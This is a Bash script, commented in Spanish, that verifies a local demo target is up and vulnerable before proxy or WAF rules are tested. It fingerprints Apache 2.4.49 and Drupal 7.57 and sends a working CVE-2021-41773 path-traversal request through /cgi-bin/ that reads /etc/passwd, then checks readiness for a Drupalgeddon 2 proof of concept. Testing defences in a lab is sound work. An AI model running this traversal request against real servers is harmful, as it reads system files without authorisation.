#!/usr/bin/env bash
# Verifica que el objetivo de demo este ARRIBA y VULNERABLE (antes de aplicar reglas del proxy).
# Uso:  bash verificar.sh            (usa http://localhost:8080)
#       bash verificar.sh http://otra-url
set -u
BASE="${1:-http://localhost:8080}"
ok=0; fail=0; pend=0
chk()  { if [ "$1" = "OK" ]; then echo "  [OK]    $2"; ok=$((ok+1)); else echo "  [FALLA] $2"; fail=$((fail+1)); fi; }
pend() { echo "  [PEND]  $1"; pend=$((pend+1)); }

echo "== Objetivo: $BASE =="

echo "-- Capa 1 (deteccion de stack) --"
# En paginas normales el proxy deja pasar el header Server del BACKEND (2.4.10). Una URL mal formada
# la contesta el propio proxy, y ahi si aparece su version real (2.4.49).
server=$(curl -s -I --path-as-is "$BASE/%zz" | tr -d '\r' | awk -F': ' 'tolower($1)=="server"{print $2}')
echo "  Server (proxy, via error 400): ${server:-<vacio>}"
case "$server" in *2.4.49*) chk OK "Apache 2.4.49 detectado en el proxy";; *) chk FAIL "No se ve Apache 2.4.49 en el header Server";; esac
code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/CHANGELOG.txt")
if [ "$code" = "200" ] && curl -s "$BASE/CHANGELOG.txt" | grep -qi "Drupal 7.57"; then chk OK "Drupal 7.57 visible en /CHANGELOG.txt"; else pend "No se confirma Drupal 7.57 en /CHANGELOG.txt (codigo $code) -- puede faltar instalar Drupal"; fi

echo "-- CVE-2021-41773 (Apache 2.4.49, lectura de archivos) --"
# El PoC va por /cgi-bin/ (ScriptAlias real). Por /icons/ NO funciona en este montaje.
body=$(curl -s --path-as-is "$BASE/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
if echo "$body" | grep -q "root:.*:0:0:"; then chk OK "Path traversal por /cgi-bin/ lee /etc/passwd (VULNERABLE)"; else chk FAIL "No se pudo leer /etc/passwd por /cgi-bin/ (reviso Require all granted + mod_cgi)"; fi

echo "-- Estado de Drupal --"
loc=$(curl -s -o /dev/null -w '%{redirect_url}' "$BASE/")
if echo "$loc" | grep -qi "install.php"; then
  echo "  / redirige a install.php => Drupal AUN NO esta instalado."
  echo "  Corre el asistente web una vez (ver README) y vuelve a ejecutar este script."
  pend "CVE-2018-7600 (Drupalgeddon 2): pendiente, falta instalar Drupal"
  pend "QA trafico legitimo: pendiente, falta instalar Drupal"
else
  echo "-- CVE-2018-7600 (Drupalgeddon 2) --"
  code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/?q=user/register")
  if [ "$code" = "200" ]; then chk OK "/user/register responde 200 (listo para el PoC)"; else chk FAIL "/user/register -> $code"; fi
  echo "-- QA (trafico legitimo que debe seguir en 200) --"
  for p in "/" "/?q=node"; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE$p")
    if [ "$code" = "200" ]; then chk OK "GET $p -> 200"; else chk FAIL "GET $p -> $code"; fi
  done
fi

echo "== Resultado: $ok OK, $fail fallas, $pend pendientes =="
[ "$fail" -eq 0 ]
